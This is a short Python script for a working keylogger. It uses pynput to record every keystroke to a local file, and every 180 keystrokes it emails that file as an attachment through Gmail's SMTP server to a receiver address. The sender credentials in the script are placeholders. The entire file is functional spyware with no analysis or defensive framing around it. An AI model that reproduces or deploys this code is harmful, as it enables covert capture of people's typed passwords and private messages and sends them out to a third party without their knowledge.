import pynput
import os
import smtplib
import schedule

from pynput.keyboard import Key, Listener
from email.message import EmailMessage

# Configuration
SMTP_SERVER = "smtp.gmail.com"  # Change this depending on the server you will use (Outlook, Yahoo etc.)
SMTP_PORT = 465 # SSL port for sending mail
SENDER_EMAIL = "senderemail@gmail.com" 
SENDER_PASSWORD = "password" # Use app password, use environmental variable for security
RECEIVER_EMAIL = "receiveremail@gmail.com"

count = 0 # Keystroke counter

def onPress(key):
        global count

        if count == 180: # At 180 keystrokes
            count = 0   # Resets the keystroke counter
            msg = createEmail("keylog.txt") # Creates and
            sendEmail(msg) # Sends Email
            writeFile(key,"w") # Overwrites the existing file
        else:
            writeFile(key, "a") # Appends existing file
            
        count+=1

def onRelease(key):
    if key == Key.esc: # Press escape to end the program
        return False

def writeFile(key, action):
    letter = str(key).replace("'","")

    if letter == 'Key.space':
        letter = ' '

    if letter == 'Key.enter':
        letter = "\n"

    if letter.find('Key') == 0:
        letter = ""
    
    if letter.find("\\x") == 0:
        letter = ""

    with open("keylog.txt",action) as f:
        f.write(letter)

def createEmail(attachment_path):
    
    msg = EmailMessage()
    msg["Subject"] = "UPDATED KEY LOG"
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECEIVER_EMAIL

    with open(attachment_path, "rb") as f:
        file_data = f.read()
        msg.add_attachment(file_data, maintype="text", subtype="plain", filename="keylog.txt")

    return msg.as_string()

def sendEmail(msg):
    global SMTP_SERVER, SMTP_PORT, SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL
    
    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL,RECEIVER_EMAIL, msg)
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()
